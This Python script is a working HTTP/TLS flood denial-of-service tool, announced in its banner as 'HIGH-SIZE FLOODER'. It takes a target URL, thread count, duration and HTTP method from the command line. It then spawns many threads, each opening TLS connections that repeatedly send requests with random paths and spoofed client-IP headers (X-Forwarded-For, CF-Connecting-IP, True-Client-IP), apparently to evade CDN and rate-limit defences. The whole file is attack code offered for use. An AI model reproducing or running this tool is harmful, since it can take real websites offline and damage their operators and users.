import socket,ssl,threading,struct
from MODEL.data import generate_url_path,get_target,gen_id,gen_ips,read

def sender(ssl_socket,byt):
   try:
      for _ in range(500):
        if read() == True:break
        ssl_socket.write(byt[0]); ssl_socket.sendall(byt[0]); ssl_socket.send(byt[0])
        ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
        ssl_socket.write(byt[1]); ssl_socket.sendall(byt[1]); ssl_socket.send(byt[1])
        ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
      ssl_socket.shutdown(socket.SHUT_RDWR)
      ssl_socket.close()
   except:pass

def HIGH_SIZE(target,methods,duration_sec_attack_dude):
    path = 1
    for _ in range(int(duration_sec_attack_dude)):
        if read() == True:break
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM, socket.IPPROTO_TCP)
            s.setblocking(1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 5); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 300); s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 63); s.setsockopt(socket.SOL_SOCKET, socket.SO_OOBINLINE, 1)
            s.connect((str(target['host']),int(target['port']))); s.connect_ex((str(target['host']),int(target['port'])))
            ssl_context = ssl.SSLContext()
            ssl_socket = ssl_context.wrap_socket(s,server_hostname=target['host'])
            ips = gen_ips()
            fixed_byt = []
            for a in ['/'+generate_url_path(num=path), target['uri']]:
                if read() == True:break
                fixed_request = f"{methods} {a} HTTP/1.1\nHost: {target['host']}\nConnection: Upgrade\nUpgrade: h2c, websocket\nUpgrade-Insecure-Requests: 1\nAccess-Control-Request-Method: GET, POST, HEAD, PUT, PATCH, OPTIONS, DELETE\nX-HTTP-Method-Override: GET, POST, HEAD, PUT, PATCH, OPTIONS, DELETE\nAllow: GET, POST, HEAD, PUT, PATCH, OPTIONS, DELETE\nRetry-After: 5\nX-Requested-With: XMLHttpRequest\nX-Request-ID: {gen_id}\nAlt-Used: {target['host']}\nCF-Connecting-IP: {ips}\nCDN-Loop: cloudflare\nX-Forwarded-Host: {target['host']}\nX-Forwarded-For: {ips}\nTrue-Client-IP: {ips}\nX-Real-IP: {ips}\nX-Forwarded-Proto: http\nFront-End-Https: on\nX-Forwarded-Protocol: https\nX-Forwarded-Ssl: on\nX-Url-Scheme: https\n\n\r\r".encode()
                fixed_byt.append(fixed_request)
            threading.Thread(target=sender,args=(ssl_socket,fixed_byt)).start()
            path += 1
        except Exception as e:
           print(e)
           pass

import sys
url = ''
METHODS = ''
time_booter = 0
thread_lower = 0
if len(sys.argv) == 5:
   url = sys.argv[1]
   thread_lower = int(sys.argv[2])
   time_booter = int(sys.argv[3])
   METHODS = sys.argv[4]
else:
 print(f'WELCOME TO HIGH-SIZE FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHOD>')
target = get_target(url)
for _ in range(int(thread_lower)):
 if read() == True:break
 for _ in range(10):
    if read() == True:break
    threading.Thread(target=HIGH_SIZE,args=(target,METHODS,time_booter)).start()
